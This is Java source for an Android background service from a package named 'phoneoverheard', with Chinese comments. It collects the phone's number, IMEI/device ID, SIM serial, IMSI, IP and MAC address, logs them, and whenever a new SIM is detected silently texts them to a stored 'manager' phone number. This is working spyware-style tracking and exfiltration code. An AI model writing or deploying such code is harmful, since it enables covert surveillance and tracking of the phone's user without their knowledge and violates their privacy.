package com.phoneoverheard.phonne;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;

import com.phoneoverheard.database.ManagerService;
import com.phoneoverheard.database.Simmsg;
import com.phoneoverheard.database.SimmsgService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class haomaService extends Service {
	private static final String TAG = "haomaService";
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		Log.i(TAG, "onCreate called.");
	}

	@Override
	public void onDestroy() {
		Log.i(TAG, "onDestroy called.");
		super.stopSelf();
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.i(TAG, "onStartCommand called.");
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	@SuppressLint("UnlocalizedSms")
	public void onStart(Intent intent, int startId) {
		Log.i(TAG, "onStart called.");
		mylog.WrLog("i", TAG, "onStart called.");
		String hostip = getLocalIpAddress(); // 获取本机IP(客户端)
		String hostmac = getLocalMacAddress(); // 获取本机MAC(客户端)
		Log.i(TAG, "hostip==" + hostip);
		Log.i(TAG, "hostmac==" + hostmac);
		mylog.WrLog("i", TAG, "hostip==" + hostip + " , hostmac==" + hostmac);
		ManagerService managerservice = new ManagerService(getBaseContext());
		managerservice.updateHostAdress("manager", hostip, hostmac);
		getPhoneNumber(getBaseContext());
		onDestroy();
	}

	/**
	 * 1.getPhoneNumber方法返回当前手机的电话号码， 同时必须在androidmanifest.xml中
	 * IMEI国际移动设备识别码（IMEI：International Mobile Equipment Identification
	 * Number）是区别移动设备的标志，储存在移动设备中，可用于监控被窃或无效的移动设备。
	 * IMEI组成如下图所示，移动终端设备通过键入“*#06#”即可查得
	 * 。其总长为15位，每位数字仅使用0～9的数字。其中TAC代表型号装配码，由欧洲型号标准中心分配
	 * ；FAC代表装配厂家号码；SNR为产品序号，用于区别同一个TAC和FAC中的每台移动设备；SP是备用编码
	 * IMSI国际移动用户识别码（IMSI：International Mobile Subscriber Identification
	 * Number）是区别移动用户的标志，储存在SIM卡中，可用于区别移动用户的有效信息
	 * IMSI组成如下图所示，其总长度不超过15位，同样使用0～9的数字。
	 * 其中MCC是移动用户所属国家代号，占3位数字，中国的MCC规定为460；MNC是移动网号码
	 * ，最多由两位数字组成，用于识别移动用户所归属的移动通信网；MSIN是移动用户识别码，用以识别某一移动通信网中的移动用户。 加入
	 * android.permission.READ_PHONE_STATE 这个权限，
	 * 2.主流的获取用户手机号码一般采用用户主动发送短信到SP或接收手机来获取。
	 * 
	 * @param context
	 */
	public void getPhoneNumber(Context context) {
		String simInfo = "";
		TelephonyManager mTelephonyMgr;
		mTelephonyMgr = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String deviceid = mTelephonyMgr.getDeviceId(); // 返回的IMEI / MEID的设备
		String tel = mTelephonyMgr.getLine1Number(); // 返回设备的电话号码（MSISDN号码）
		String imei = mTelephonyMgr.getSimSerialNumber(); // IMEI
															// 国际移动设备识别码,SIM卡的序列号
		String imsi = mTelephonyMgr.getSubscriberId(); // IMSI 国际移动用户识别码
														// ,SIM卡唯一标识
		int SimState = mTelephonyMgr.getSimState(); // SIM卡状态
		simInfo = "tel:" + tel + ",imei:" + imei + ",imsi:" + imsi
				+ ",deviceid:" + deviceid + ",SimState:" + SimState;
		Log.i(TAG, "SIM卡信息：" + simInfo);
		mylog.WrLog("i", TAG, "SIM卡信息：" + simInfo);
		ManagerService managerservice = new ManagerService(getBaseContext());
		SimmsgService simmsgservice = new SimmsgService(getBaseContext());
		if (simmsgservice.dataExist(imsi)) {

			if (null == tel || tel.isEmpty()) {

			} else {
				Simmsg simmsg = new Simmsg(tel, deviceid, imei, imsi, SimState);
				simmsgservice.update(simmsg);
			}
		} else {
			String telnumber = managerservice.find("manager").getTelnumber();
			Simmsg simmsg = new Simmsg(telnumber, deviceid, imei, imsi,
					SimState);
			simmsgservice.insert(simmsg);
			// 移动运营商允许每次发送的字节数据有限，我们可以使用Android给我们提供 的短信工具。
			SmsManager sms = SmsManager.getDefault();
			// 如果短信没有超过限制长度，则返回一个长度的List。
			List<String> texts = sms.divideMessage(simInfo);
			for (String text : texts) {
				sms.sendTextMessage(telnumber, null, text, null, null);
			}
		}
	}

	// 获取本机IP地址
	public String getLocalIpAddress() {
		try {
			for (Enumeration<NetworkInterface> en = NetworkInterface
					.getNetworkInterfaces(); en.hasMoreElements();) {
				NetworkInterface intf = en.nextElement();
				for (Enumeration<InetAddress> enumIpAddr = intf
						.getInetAddresses(); enumIpAddr.hasMoreElements();) {
					InetAddress inetAddress = enumIpAddr.nextElement();
					if (!inetAddress.isLoopbackAddress()) {
						return inetAddress.getHostAddress().toString();
					}
				}
			}
		} catch (SocketException ex) {
			Log.e(TAG, "WifiPreference IpAddress\n" + ex.toString());
			mylog.WrLog("e", TAG, "WifiPreference IpAddress\n" + ex.toString());
		}
		return null;
	}

	// 获取本机MAC地址
	public String getLocalMacAddress() {
		String LocalMacAddress = "";
		try {
			WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);
			WifiInfo info = wifi.getConnectionInfo();
			LocalMacAddress = info.getMacAddress();
		} catch (Exception ex) {
			Log.e(TAG, "WifiPreference IpAddress\n" + ex.toString());
			mylog.WrLog("e", TAG, "WifiPreference IpAddress\n" + ex.toString());
		}
		return LocalMacAddress;
	}

}
